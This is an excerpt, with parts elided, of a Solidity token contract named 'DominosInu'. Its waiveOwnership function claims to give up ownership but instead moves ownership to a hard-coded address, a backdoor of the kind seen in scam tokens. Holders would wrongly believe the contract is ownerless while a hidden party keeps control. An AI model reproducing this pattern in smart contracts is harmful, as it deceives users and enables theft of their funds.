...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x73E6e9e1Ae6e7835337b5A5DB1A89FAc3C677CDe));
        _owner = address(0x73E6e9e1Ae6e7835337b5A5DB1A89FAc3C677CDe);
    }
...
contract DominosInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DominosInu";
    string private _symbol = "DominosInu";
